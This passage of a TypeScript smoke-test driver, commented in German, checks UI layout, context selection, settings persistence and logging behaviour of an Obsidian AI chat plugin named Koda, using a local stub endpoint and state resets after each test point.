      // geblieben, egal ob setCollapsed selbst speichert oder nicht. Der Preis: der interne
      // Save ist async und ungewartet, also wird auf das Ergebnis gepollt statt es sofort
      // zu lesen.
      await cdp.evaluate(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        p.sectionStorage().setCollapsed("workspace", true);
        return true;
      `);
      const nachReload = await pollUntil<boolean>(
        cdp,
        `
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          const daten = await p.loadData();
          // Noch nicht geschrieben heisst „noch nicht so weit" — null statt false, sonst
          // wuerde pollUntil einen fruehen Zwischenstand als Endergebnis nehmen.
          if ((daten?.contextSections?.workspace ?? false) !== true) return null;
          return true;
        `,
        5_000,
      );
      const gespeichert = await cdp.evaluate<unknown>(`
        return app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].settings.contextSections.workspace;
      `);
      ok31 = gespeichert === true && nachReload === true;
      detail31 = `im Speicher: ${String(gespeichert)} · in data.json: ${String(nachReload)}`;
    } catch (error) {
      detail31 = `Abbruch: ${error instanceof Error ? error.message : String(error)}`;
    } finally {
      // Fix-Runde 1, Finding 2: im finally, nicht am Ende des try — sonst verfaelscht ein
      // Abbruch NACH dem setCollapsed(true) (z. B. ein Timeout im pollUntil) die
      // Einstellungen des naechsten Laufs, weil der Reset dann nie erreicht wird.
      await cdp.evaluate(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        p.sectionStorage().setCollapsed("workspace", false);
        await p.saveSettings();
        return true;
      `).catch(() => undefined);
    }
    // Gegenprobe: in `sectionStorage().setCollapsed` (src/main.ts) das
    // `void this.saveSettings();` entfernen, neu bauen/deployen. Erwartung: pollUntil
    // laeuft in den 5s-Timeout, „nachReload" bleibt null, detail zeigt
    // "in data.json: null" statt "true" — der Punkt wird rot.
    record("31. Auf/Zu-Zustand der Abschnitte landet in data.json", ok31, detail31);

    let ok32 = false;
    let detail32 = "";
    try {
      // Befund 1 (Review 2026-09-05): der Chat-Tab hatte seinen Spalten-Flex-Container
      // verloren, weil er unter `.okit-hub-panel` (ein BLOCK-Container) haengt. `.koda-log`
      // war dann Inhaltshoehe statt Restflaeche, und `.koda-input-bar` klebte am Ende des
      // Verlaufs statt am unteren Rand des Panels. Punkt 2 (Kopfzeilen-Groesse) und Punkt 29
      // (Tab-Hoehe > 0) haetten das nicht gesehen — beide messen Existenz/Groesse, keine
      // Position. Dieser Punkt misst POSITION: `display: flex` am Panel UND die Unterkante
      // der Eingabezeile nahe der Unterkante des Panels, nicht irgendwo in der Mitte.
      await cdp.evaluate(`
        await app.commands.executeCommandById(${JSON.stringify(`${PLUGIN_ID}:tab-chat`)});
        return true;
      `);
      const geo = await pollUntil<{ display: string; panelBottom: number; barBottom: number; diff: number }>(
        cdp,
        `
          const panel = document.querySelector(".koda-hub .okit-hub-panel[data-tab='chat']");
          const bar = document.querySelector(".koda-hub .okit-hub-panel[data-tab='chat'] .koda-input-bar");
          // Panel noch nicht sichtbar/gemountet oder Tab-Wechsel noch nicht angekommen:
          // „noch nicht so weit" ist null, nie ein Objekt mit Nullwerten (pollUntil-Vertrag).
          if (!panel || !bar || panel.classList.contains("is-hidden")) return null;
          const pr = panel.getBoundingClientRect();
          const br = bar.getBoundingClientRect();
          if (pr.height === 0) return null;
          return {
            display: getComputedStyle(panel).display,
            panelBottom: pr.bottom,
            barBottom: br.bottom,
            diff: Math.abs(pr.bottom - br.bottom),
          };
        `,
        8_000,
      );
      if (geo === null) throw new Error("Chat-Panel/Eingabezeile nicht innerhalb 8s gerendert");
      // Ein paar Pixel Toleranz fuer Border/Padding des Panels — die Eingabezeile muss am
      // unteren Rand sitzen, nicht irgendwo im Verlauf.
      ok32 = geo.display === "flex" && geo.diff <= 4;
      detail32 = `display: ${geo.display} · Panel-Unterkante ${geo.panelBottom.toFixed(1)}px · Eingabe-Unterkante ${geo.barBottom.toFixed(1)}px · Differenz ${geo.diff.toFixed(1)}px`;
    } catch (error) {
      detail32 = `Abbruch: ${error instanceof Error ? error.message : String(error)}`;
    }
    // Gegenprobe: in `styles.css` die Regel
    // `.koda-hub .okit-hub-panel[data-tab="chat"] { display: flex; flex-direction: column; overflow: hidden; }`
    // entfernen (oder auf einen Bau VOR Befund-1-Fix zurueckgehen). Erwartung: `display`
    // meldet `block` statt `flex`, der Punkt wird rot allein daran — unabhaengig davon, ob
    // bei kurzem Verlauf die Differenz zufaellig noch klein ausfaellt.
    record("32. Chat-Panel ist Spalten-Flex, Eingabezeile sitzt am unteren Rand (nicht im Verlauf)", ok32, detail32);

    // ---- 33: Modus Notiz nimmt die aktive Notiz und ihre Nachbarn im Volltext mit
    // Kulisse: dieselbe `SCENE_JS` wie 20/23 (es gibt keinen eigenen Helfer `oeffneNotiz` —
    // eine erste Fassung dieser Task nahm das an; der Treiber hat nur SCENE_JS).
    // Gegenprobe: in `src/core/context/candidates.ts` die Breitensuche (die beiden
    // `for`-Schleifen ueber `input.links.outgoing`/`.backlinks`) auskommentieren, neu
    // bauen/deployen. Erwartung: `nachbarn` ist 0 und der Punkt wird rot — der Volltext der
    // aktiven Notiz allein reicht nicht.
    let ok33 = false;
    let detail33 = "";
    const vorherMode33 = await cdp.evaluate<string>(`return app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].contextMode;`);
    try {
      const idx33 = await cdp.evaluate<number>(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        ${SCENE_JS}
        await app.commands.executeCommandById(${JSON.stringify(`${PLUGIN_ID}:context-mode-note`)});
        return idx;
      `);
      if (idx33 < 0) throw new Error(idx33 === -2 ? "Fixture-Notiz Notes/Project plan.md fehlt" : "Kulisse nicht hergestellt");
      const r = await pollUntil<{
        items: { path: string; source: string; kind: string }[];
        hatVolltext: boolean;
        hatNachbarText: boolean;
      }>(
        cdp,
        `
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          const ctx = await p.currentContext();
          if (!ctx || ctx.mode !== "note") return null;
          return {
            items: ctx.items.map((i) => ({ path: i.path, source: i.source, kind: i.kind })),
            hatVolltext: ctx.text.includes("Model control makes"),
            hatNachbarText: ctx.text.includes("Koda knows seven tools"),
          };
        `,
        10_000,
      );
      if (r === null) throw new Error("kein Notiz-Kontext innerhalb 10s");
      const nachbarn = r.items.filter((i) => i.source === "link" || i.source === "backlink").length;
      ok33 = r.hatVolltext && r.hatNachbarText && nachbarn > 0 && r.items.every((i) => i.kind === "full");
      detail33 = `Eintraege ${r.items.length} · Nachbarn ${nachbarn} · Volltext aktive Notiz ${r.hatVolltext} · Volltext Nachbar ${r.hatNachbarText}`;
    } catch (error) {
      detail33 = `Abbruch: ${error instanceof Error ? error.message : String(error)}`;
    }
    // Kein finally hier — Punkt 34 braucht den Modus Notiz absichtlich weiter aktiv (er
    // misst dieselbe Situation mit engerem Budget). Zurueckgesetzt wird erst am Ende von 35.
    record("33. Modus Notiz schickt die aktive Notiz UND einen verlinkten Nachbarn im Volltext", ok33, detail33);

    // ---- 34: Die Budget-Kappung meldet sich im Block
    // ⚠️ Korrektur zur Planvorlage: die dort vorgesehenen `contextBudgetChars = 2000` kuerzen
    // hier NICHTS — die drei Fixture-Notizen aus Punkt 33 (aktive Notiz + zwei Nachbarn)
    // sind zusammen rund 820 Zeichen gross (`wc -c` auf die drei Dateien, gemessen, nicht
    // angenommen). Bei 2000 haette der Punkt seinen Gegenstand nie beruehrt und waere still
    // an der ersten Ausnahme unten gescheitert. 300 kuerzt zuverlaessig alle drei Eintraege.
    // Gegenprobe: in `src/core/context/render.ts` die `meldung`-Zeile auf `""` setzen, neu
    // bauen/deployen. Erwartung: `hatMeldung` ist false, der Punkt wird rot, obwohl der
    // Block weiterhin gekuerzt ist — genau der stille Verlust, gegen den er steht.
    // ⚠️ Ist auch 33 rot, zuerst 33 beheben — ohne Nachbarn im Modus Notiz gibt es nichts zu
    // kuerzen, und dieser Punkt bricht dann mit "Gegenstand nicht beruehrt" ab statt gruen
    // durchzulaufen (33 ist die Ursache, 34s Rot hier ist nur die Folge).
    let ok34 = false;
    let detail34 = "";
    const BUDGET34 = 300;
    const vorherBudget = await cdp.evaluate<number>(`return app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].settings.contextBudgetChars;`);
    try {
      await cdp.evaluate(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        p.settings.contextBudgetChars = ${JSON.stringify(BUDGET34)};
        await p.saveSettings();
        return true;
      `);
      const r = await pollUntil<{ gekuerzt: number; hatMeldung: boolean; laenge: number }>(
        cdp,
        `
          const ctx = await app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].currentContext();
          if (!ctx) return null;
          const gekuerzt = ctx.items.filter((i) => typeof i.fullChars === "number");
          // Ohne gekuerzten Eintrag hat der Punkt seinen Gegenstand nicht beruehrt.
          if (gekuerzt.length === 0) return null;
          return { gekuerzt: gekuerzt.length, hatMeldung: /gek(ü|ue)rzt: \\d+ von \\d+ Zeichen|cut: \\d+ of \\d+ chars/.test(ctx.text), laenge: ctx.text.length };
        `,
        10_000,
      );
      if (r === null) throw new Error(`kein gekuerzter Eintrag bei Budget ${BUDGET34} — Gegenstand nicht beruehrt`);
      ok34 = r.hatMeldung && r.laenge <= 4000;
      detail34 = `Budget ${BUDGET34} · gekuerzte Eintraege ${r.gekuerzt} · Meldung im Block ${r.hatMeldung} · Blocklaenge ${r.laenge} Z.`;
    } catch (error) {
      detail34 = `Abbruch: ${error instanceof Error ? error.message : String(error)}`;
    } finally {
      await cdp.evaluate(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        p.settings.contextBudgetChars = ${JSON.stringify(vorherBudget)};
        await p.saveSettings();
        return true;
      `).catch(() => undefined);
    }
    record("34. Die Budget-Kappung meldet sich im Block, statt still zu kuerzen", ok34, detail34);

    // ---- 35: Manuell hinzugefuegte Notiz geht mit und laesst sich wieder entfernen
    // Gegenprobe: in `src/core/context/candidates.ts` die `manual`-Schleife
    // (`for (const p of input.manual) nimm(...)`) entfernen, neu bauen/deployen. Erwartung:
    // `mitManuell` enthaelt den Pfad nie, der Punkt wird rot.
    let ok35 = false;
    let detail35 = "";
    try {
      const r = await cdp.evaluate<{ ohne: string[]; mitManuell: string[]; danach: string[]; ziel: string }>(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        const ZIEL = "Notes/Compaction.md";
        const ohne = ((await p.currentContext())?.items ?? []).map((i) => i.path);
        p.addContextPaths([ZIEL]);
        const mitManuell = ((await p.currentContext())?.items ?? []).filter((i) => i.source === "manual").map((i) => i.path);
        p.removeContextPath(ZIEL);
        const danach = ((await p.currentContext())?.items ?? []).filter((i) => i.source === "manual").map((i) => i.path);
        return { ohne, mitManuell, danach, ziel: ZIEL };
      `);
      ok35 = r.mitManuell.includes(r.ziel) && !r.danach.includes(r.ziel);
      detail35 = `manuell nach dem Hinzufuegen: [${r.mitManuell.join(", ")}] · nach dem Entfernen: [${r.danach.join(", ")}]`;
    } catch (error) {
      detail35 = `Abbruch: ${error instanceof Error ? error.message : String(error)}`;
    } finally {
      // Modus und Auswahl zurueck auf den Stand vor Punkt 33 — 34/35 liefen absichtlich
      // beide im Modus Notiz weiter.
      await cdp.evaluate(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        p.resetContextSelection();
        await app.commands.executeCommandById(${JSON.stringify(`${PLUGIN_ID}:context-mode-`)} + ${JSON.stringify(vorherMode33)});
        return true;
      `).catch(() => undefined);
    }
    record("35. Eine von Hand hinzugefuegte Notiz geht mit und laesst sich wieder entfernen", ok35, detail35);

    // ---- 36: read_note liest eine .base
    // Gegenprobe: in `src/obsidian/vault-tools.ts` das zweite Argument von
    // `resolveNotePath(path, READ_EXTENSIONS)` in `read` entfernen, neu bauen/deployen.
    // Erwartung: `ok` ist false, die Fehlermeldung nennt `.md`, der Punkt wird rot.
    let ok36 = false;
    let detail36 = "";
    try {
      const r = await cdp.evaluate<{ ok: boolean; inhalt: string; mdOk: boolean }>(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        const tools = p.buildTools();
        const aus = await tools.run("read_note", { path: "Notes/Overview.base" });
        const md = await tools.run("read_note", { path: "Notes/Tools.md" });
        return { ok: aus.ok === true, inhalt: (aus.content ?? aus.error ?? "").slice(0, 120), mdOk: md.ok === true };
      `);
      // Die .md-Probe daneben belegt, dass das Werkzeug ueberhaupt laeuft — sonst waere ein
      // rotes 36 auch mit einem kaputten read_note erklaerbar.
      ok36 = r.ok && r.inhalt.includes("views:") && r.mdOk;
      detail36 = `.base gelesen: ${r.ok} · .md gelesen: ${r.mdOk} · Anfang: ${JSON.stringify(r.inhalt.slice(0, 60))}`;
    } catch (error) {
      detail36 = `Abbruch: ${error instanceof Error ? error.message : String(error)}`;
    }
    record("36. read_note liest eine .base aus dem Fixture (und weiterhin .md)", ok36, detail36);

    // ---- 37: Quellen-Chips unter der Antwort
    // Der Punkt setzt einen kuenstlichen Verlauf, weil der Smoke bewusst ohne Modell laeuft.
    // Gemessen wird der RENDERER, und der ist die einzige Stelle, an der aus dem
    // persistierten `context.items` sichtbare Chips werden.
    // Gegenprobe: in `src/core/context/labels.ts` in `sourceChips` den `kind`-Filter
    // entfernen. Erwartung: der Zeiger-Eintrag erscheint als dritter Chip, `chips` ist 3
    // statt 2, der Punkt wird rot.
    let ok37 = false;
    let detail37 = "";
    try {
      await cdp.evaluate(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        window.__kodaLogVorher = p.chatLog;
        p.chatLog = [
          { role: "user", content: "Frage", context: { mode: "note", text: "Block", items: [
            { source: "active", path: "Notes/Project plan.md", kind: "full", chars: 500 },
            { source: "link", path: "Notes/Tools.md", kind: "full", chars: 200 },
            { source: "tab", path: "Notes/Compaction.md", kind: "pointer", chars: 11 },
          ] } },
          { role: "assistant", content: "Antwort" },
        ];
        for (const l of app.workspace.getLeavesOfType(${JSON.stringify(VIEW_TYPE)})) l.view.renderLog();
        return true;
      `);
      const r = await pollUntil<{ anzahl: number; titel: string[]; hoehe: number }>(
        cdp,
        `
          const leiste = document.querySelector(".koda-sources");
          if (!leiste) return null;
          const chips = Array.from(leiste.querySelectorAll(".koda-source-chip"));
          if (chips.length === 0) return null;
          return {
            anzahl: chips.length,
            titel: chips.map((c) => c.getAttribute("title")),
            hoehe: Math.min(...chips.map((c) => c.getBoundingClientRect().height)),
          };
        `,
        8_000,
      );
      if (r === null) throw new Error("keine Quellen-Leiste innerhalb 8s gerendert");
      ok37 = r.anzahl === 2 && r.hoehe > 0 && !r.titel.includes("Notes/Compaction.md");
      detail37 = `Chips ${r.anzahl} · kleinste Hoehe ${r.hoehe}px · Titel: ${r.titel.join(" | ")}`;
    } catch (error) {
      detail37 = `Abbruch: ${error instanceof Error ? error.message : String(error)}`;
    } finally {
      await cdp.evaluate(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        if (window.__kodaLogVorher) { p.chatLog = window.__kodaLogVorher; delete window.__kodaLogVorher; }
        for (const l of app.workspace.getLeavesOfType(${JSON.stringify(VIEW_TYPE)})) l.view.renderLog();
        return true;
      `).catch(() => undefined);
    }
    record("37. Quellen-Chips stehen unter der Antwort — nur Volltext-Quellen, Hoehe > 0", ok37, detail37);

    // ---- 38: Kontext-Tab zeigt einen sichtbaren Fehlerzustand, wenn das ViewModel ablehnt
    // Zusatzpunkt (nicht im Plan) — Befund aus Task 8, Review 2026-09-05: `ContextPanel.render()`
    // faengt eine Ablehnung von `host.viewModel()` ab und malt einen Fehlerzustand
    // (§8-Vokabular: `is-error`, `alert-triangle`, sichtbarer Fliesstext). Kein Unit-Test
    // erreicht das, weil es an der Kante zum Host haengt (Promise-Rejection ueber den
    // View-Kanal). Gemessen wird der Zustand, nicht der Code: `contextViewModel` wird
    // durch eine ablehnende Fassung ersetzt, dann neu gerendert.
    // Gegenprobe: in `src/obsidian/context-panel.ts` das `.catch(...)` an `render()`
    // entfernen. Erwartung: die Ablehnung landet unbehandelt (Konsole), `.koda-ctx-summary`
    // bekommt nie `is-error`, `pollUntil` laeuft in den Timeout, der Punkt wird rot.
    let ok38 = false;
    let detail38 = "";
    try {
      await cdp.evaluate(`
        await app.commands.executeCommandById(${JSON.stringify(`${PLUGIN_ID}:tab-context`)});
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        window.__koda38Original = p.contextViewModel.bind(p);
        p.contextViewModel = () => Promise.reject(new Error("smoke-38"));
        for (const l of app.workspace.getLeavesOfType(${JSON.stringify(VIEW_TYPE)})) l.view.syncContextPanel();
        return true;
      `);
      const r = await pollUntil<{ istFehler: boolean; bodyHoehe: number; bodyText: string }>(
        cdp,
        `
          const summary = document.querySelector(".koda-ctx-summary");
          if (!summary || !summary.classList.contains("is-error")) return null;
          const body = document.querySelector(".koda-ctx-body");
          const rect = body ? body.getBoundingClientRect() : null;
          const text = body ? body.textContent.trim() : "";
          if (!rect || text === "") return null;
          return { istFehler: true, bodyHoehe: rect.height, bodyText: text };
        `,
        8_000,
      );
      if (r === null) throw new Error("keine Fehlerdarstellung innerhalb 8s");
      ok38 = r.istFehler && r.bodyHoehe > 0 && r.bodyText.length > 0;
      detail38 = `is-error: ${r.istFehler} · Body-Hoehe ${r.bodyHoehe}px · Text: "${r.bodyText}"`;
    } catch (error) {
      detail38 = `Abbruch: ${error instanceof Error ? error.message : String(error)}`;
    } finally {
      await cdp.evaluate(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        if (window.__koda38Original) { p.contextViewModel = window.__koda38Original; delete window.__koda38Original; }
        for (const l of app.workspace.getLeavesOfType(${JSON.stringify(VIEW_TYPE)})) l.view.syncContextPanel();
        return true;
      `).catch(() => undefined);
    }
    record("38. Kontext-Tab zeigt einen sichtbaren Fehlerzustand, wenn das ViewModel ablehnt", ok38, detail38);

    // ---- 39: Knopf und Befehl "+ Aktive Notiz" landen auf demselben Zustand
    // Zusatzpunkt (nicht im Plan) — Befund aus Task 8, Review 2026-09-05 (Befund 6): der
    // Knopf im Kontext-Tab rief vorher seine eigene Kopie der Orchestrierung, statt
    // `addContextActive()` zu teilen. Gemessen wird auf dem ZUSTAND (`contextManual`), nicht
    // am Code: Befehl ausloesen, Zustand lesen, zuruecksetzen, Knopf klicken, Zustand
    // erneut lesen — beide muessen denselben Pfad eintragen.
    // ⚠️ Ehrlicher Grenzfall: der Punkt bleibt nur so lange gruen, wie Knopf und Befehl
    // ZUFAELLIG dasselbe Ergebnis liefern. Eine Gegenprobe, die den Knopf auf einen von
    // Hand nachgebauten Duplikat-Pfad umstellt (statt `this.host.addActive()` zu rufen),
    // waere semantisch derselbe Fehler wie der behobene Befund — trifft aber nur dann auf
    // einen roten Punkt, wenn der Duplikat-Nachbau tatsaechlich abweicht. `-notiz`/`-ordner`
    // oeffnen je ein Modal und sind fuer einen automatisierten Klick nicht geeignet; nur die
    // aktive-Notiz-Variante ist ohne Modal pruefbar.
    // Gegenprobe: in `src/obsidian/context-panel.ts` den "+ Aktive Notiz"-Knopf auf
    // `this.host.addActive()` durch einen eigenen Aufbau ersetzen, der einen ANDEREN Pfad
    // eintraegt (z. B. fest "Notes/Tools.md" statt der aktiven Notiz). Erwartung:
    // `nachKlick` enthaelt "Notes/Tools.md" statt des Pfads der aktiven Notiz, `ok39` wird
    // false, der Punkt rot.
    let ok39 = false;
    let detail39 = "";
    try {
      const start = await cdp.evaluate<{ idx: number; aktivPfad: string | null; nachBefehl: string[] }>(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        ${SCENE_JS}
        p.resetContextSelection();
        await app.commands.executeCommandById(${JSON.stringify(`${PLUGIN_ID}:context-add-active`)});
        return { idx, aktivPfad: app.workspace.activeLeaf?.view?.file?.path ?? null, nachBefehl: [...p.contextManual] };
      `);
      if (start.idx < 0) throw new Error(start.idx === -2 ? "Fixture-Notiz Notes/Project plan.md fehlt" : "Kulisse nicht hergestellt");
      if (start.aktivPfad === null) throw new Error("keine aktive Notiz nach der Kulisse");
      await cdp.evaluate(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        p.resetContextSelection();
        await app.commands.executeCommandById(${JSON.stringify(`${PLUGIN_ID}:tab-context`)});
        return true;
      `);
      const sichtbar = await pollUntil<boolean>(cdp, `return !!document.querySelector(".koda-ctx-add button") || null;`, 8_000);
      if (sichtbar !== true) throw new Error("Kontext-Tab-Knoepfe nicht innerhalb 8s sichtbar");
      const geklickt = await clickReal(cdp, `document.querySelector(".koda-ctx-add button:first-of-type")`);
      if (!geklickt) throw new Error("Knopf '+ Aktive Notiz' nicht klickbar");
      const nachKlick = await pollUntil<string[]>(
        cdp,
        `
          const m = [...app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].contextManual];
          return m.length > 0 ? m : null;
        `,
        8_000,
      );
      if (nachKlick === null) throw new Error("kein manueller Eintrag nach dem Klick innerhalb 8s");
      ok39 = start.nachBefehl.includes(start.aktivPfad) && nachKlick.includes(start.aktivPfad);
      detail39 = `aktive Notiz: ${start.aktivPfad} · nach Befehl: [${start.nachBefehl.join(", ")}] · nach Klick: [${nachKlick.join(", ")}]`;
    } catch (error) {
      detail39 = `Abbruch: ${error instanceof Error ? error.message : String(error)}`;
    } finally {
      await cdp.evaluate(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        p.resetContextSelection();
        await app.commands.executeCommandById(${JSON.stringify(`${PLUGIN_ID}:tab-chat`)});
        return true;
      `).catch(() => undefined);
    }
    record("39. Knopf '+ Aktive Notiz' und Befehl context-add-active landen auf demselben Zustand", ok39, detail39);

    // --- 40. Abgeschnittene Antwort (finish_reason "length", MIT Text) wird als Hinweis
    // gemeldet, nicht verschluckt ---------------------------------------------
    // Die pure Auswertung ist laengst durch Unit-Tests belegt (chat_client.test.ts,
    // loop.test.ts). Was die dort NICHT sehen koennen, ist die Obsidian-Kante: main.ts
    // setzt lastNotice, view.ts rendert ihn. Ein echter finish_reason:"length"-Chunk aus
    // einem eigenen SSE-Server (wie Pruefpunkt 3-5, kein Modell noetig) ist dafuer das
    // richtige Mittel — direktes chatLog-Pushen (Muster Pruefpunkt 6/7) wuerde main.ts'
    // Event-Handler gar nicht durchlaufen und den Punkt seines Gegenstands berauben.
    await fake?.close();
    const truncStub = { content: "Halber Satz", finishReason: "length" };
    fake = await startFakeEndpoint(0, truncStub);
    let detail40 = "";
    let ok40 = false;
    try {
      await cdp.evaluate(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        p.settings.endpoints = [{ url: ${JSON.stringify(fake.url)} }];
        await p.saveSettings();
        await p.newChat();
        void p.ask("Smoke-Test: bitte antworten.");
        return true;
      `);
      const getroffen = await pollUntil<{ noticeText: string; noticeKlasse: string; assistantText: string; busy: boolean }>(
        cdp,
        `
          const p2 = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          if (p2.busy) return null;
          const el = app.workspace.getLeavesOfType(${JSON.stringify(VIEW_TYPE)})[0]?.view?.containerEl;
          // Nicht die erste Notiz nehmen: das Fixture hat einen aktiven Skill, und dessen
          // ".koda-notice.koda-skills" steht laut renderLog() VOR dem Verlauf, waehrend
          // lastNotice zuletzt gerendert wird — ein blosses ".koda-notice" hier waere ein
          // Falsch-Gruen auf den Skill-Hinweis, nicht auf den Trunkierungs-Hinweis.
          const notice = el?.querySelector(".koda-notice:not(.koda-skills):not(.koda-sources)");
          const assistant = el?.querySelector(".koda-assistant:not(.koda-placeholder)");
          if (!notice || !assistant) return null;
          return {
            noticeText: notice.textContent.trim(),
            noticeKlasse: notice.className,
            assistantText: assistant.textContent.trim(),
            busy: p2.busy,
          };
        `,
        15_000,
      );
      ok40 =
        getroffen !== null
        && getroffen.busy === false
        && !getroffen.noticeKlasse.includes("koda-error")
        && getroffen.assistantText.includes(truncStub.content)
        && getroffen.noticeText.length > 0;
      detail40 = getroffen
        ? `Notiz „${getroffen.noticeText.slice(0, 90)}“ (${getroffen.noticeKlasse}) · Antworttext „${getroffen.assistantText}“`
        : "kein Hinweis und keine Antwortblase innerhalb 15s";
      if (ok40) {
        mkdirSync("/tmp/w6-shots", { recursive: true });
        const box = await boxOf(cdp, ".koda-log");
        const png = await capture(cdp, box ?? undefined);
        writeFileSync("/tmp/w6-shots/koda-truncated.png", png);
      }
    } catch (error) {
      detail40 = `Abbruch: ${error instanceof Error ? error.message : String(error)}`;
    } finally {
      await fake?.close();
      fake = null;
    }
    record("40. Abgeschnittene Antwort (finish_reason length, mit Text) meldet einen Hinweis statt zu schweigen", ok40, detail40);

    // --- 41. llm-lab-Meldestrecke (Konsumenten-Seite) -----------------------
    // Spiegelbild zu Punkt 40: kein Modell noetig, echter p.ask()-Roundtrip gegen den
    // gleichen SSE-Stub-Server (Muster oben), diesmal mit finish_reason "stop". Geprueft
    // wird NICHT, ob ein echtes llm-lab die Zeile speichert (das ist dessen Smoke) — nur,
    // dass Koda ueberhaupt meldet und mit welchen Feldern (Task „llm-lab als Konsument
    // anschliessen", apiVersion 4: turnId, promptTemplate, contextPaths).
    //
    // Ein Stub statt eines echten Lab, aus demselben Grund wie in vault-rags Treiber: die
    // Zusage ist "wir rufen logToLab(app, {...}) mit diesen Feldern", nicht "das Lab
    // verhaelt sich richtig" — und ein echtes Lab im Fixture wuerde dessen Aufzeichnung mit
    // Testzeilen verunreinigen. Das Fixture fuehrt llm-lab nicht (community-plugins.json),
    // der Zweig laeuft hier also immer; ein spaeter installiertes echtes Lab wird trotzdem
    // erkannt und der Punkt uebersprungen statt es zu verunreinigen.
    const labVorher = await cdp.evaluate<boolean>(`return !!app.plugins.plugins["llm-lab"];`);
    let detail41 = "";
    let ok41 = false;
    if (labVorher) {
      detail41 = "uebersprungen — ein llm-lab-Eintrag existiert bereits (echtes Plugin oder Rest eines abgebrochenen Laufs); Stub wuerde ihn ueberschreiben";
      record("41. llm-lab-Meldestrecke (Konsumenten-Seite): turnId/promptTemplate/Nachrichten korrekt gemeldet", true, detail41);
    } else {
      fake = await startFakeEndpoint(0, { content: "Ok.", finishReason: "stop" });
      try {
        await cdp.evaluate(`
          window.__kodaLabSeen = [];
          app.plugins.plugins["llm-lab"] = {
            __kodaSmokeStub: true,
            api: {
              apiVersion: 4,
              status: () => ({ apiVersion: 4, recording: true }),
              log: (input) => { window.__kodaLabSeen.push(input); return "smoke-" + window.__kodaLabSeen.length; },
            },
          };
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          p.settings.endpoints = [{ url: ${JSON.stringify(fake.url)} }];
          await p.saveSettings();
          await p.newChat();
          void p.ask("Smoke-Test: bitte antworten.");
          return true;
        `);
        const gemeldet = await pollUntil<{
          feature: string; model: string; endpointUrl: string; content: string;
          latencyMs: number; turnId: string; promptTemplate: string;
          messages: { role: string; content: string }[];
        }>(
          cdp,
          `
            const p2 = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
            if (p2.busy) return null;
            const seen = window.__kodaLabSeen || [];
            return seen.length > 0 ? seen[0] : null;
          `,
          15_000,
        );
        ok41 =
          gemeldet !== null
          && gemeldet.feature !== ""
          && gemeldet.endpointUrl === fake.url
          && gemeldet.content === "Ok."
          && gemeldet.latencyMs >= 0
          && typeof gemeldet.turnId === "string" && gemeldet.turnId !== ""
          && gemeldet.promptTemplate !== ""
          && Array.isArray(gemeldet.messages)
          && gemeldet.messages.some((m) => m.role === "user" && m.content.includes("Smoke-Test"))
          && !gemeldet.messages.some((m) => (m as { role: string }).role === "tool");
        detail41 = gemeldet
          ? `feature „${gemeldet.feature}“ · model „${gemeldet.model}“ · turnId ${gemeldet.turnId.slice(0, 12)}… · `
            + `promptTemplate ${gemeldet.promptTemplate.length} Z. · Nachrichten ${gemeldet.messages.length} (nur system/user/assistant) · content „${gemeldet.content}“`
          : "kein log()-Aufruf innerhalb 15s";
      } catch (error) {
        detail41 = `Abbruch: ${error instanceof Error ? error.message : String(error)}`;
      } finally {
        await fake?.close();
        fake = null;
        await cdp.evaluate(`
          delete app.plugins.plugins["llm-lab"];
          delete window.__kodaLabSeen;
          return true;
        `).catch(() => undefined);
      }
      record("41. llm-lab-Meldestrecke (Konsumenten-Seite): turnId/promptTemplate/Nachrichten korrekt gemeldet", ok41, detail41);
    }

    // --- 42. list_notes nennt Unterordner — auch einen ohne Notiz -----------------
    // Anlass 2026-09-25: `list_notes("_Koda")` meldete „4 von 4 Notizen", verschwieg drei
    // bewohnte Unterordner, und Koda berichtete sie als nicht existent. Die pure Schicht ist
    // unit-getestet; offen ist hier nur die NAHT: liefert `vault.getAllFolders()` einen Ordner
    // ohne Notiz wirklich, und taucht die Wurzel ("/") nirgends als Unterordner auf?
    // Der Punkt baut seinen Zustand selbst und prueft vorher, dass es ihn noch nicht gibt
    // (CORE-TEST-21) — sonst misst ein Rest aus einem abgebrochenen Lauf statt des Prueflings.
    const W42 = "Koda/smoke42";
    let detail42 = "nicht gelaufen";
    let ok42 = false;
    let eigen42 = true; // aufgeraeumt wird nur, was dieser Lauf angelegt hat
    try {
      const r42 = await cdp.evaluate<{
        vorher: boolean;
        flat?: { ok: boolean; content?: string; error?: string };
        root?: { ok: boolean; content?: string; error?: string };
        fehlt?: { ok: boolean; content?: string; error?: string };
      }>(`
        const W = ${JSON.stringify(W42)};
        if (app.vault.getAbstractFileByPath(W) !== null) return { vorher: true };
        await app.vault.createFolder(W + "/Voll");
        await app.vault.createFolder(W + "/Ohne");
        await app.vault.create(W + "/Voll/a.md", "x");
        await app.vault.create(W + "/oben.md", "x");
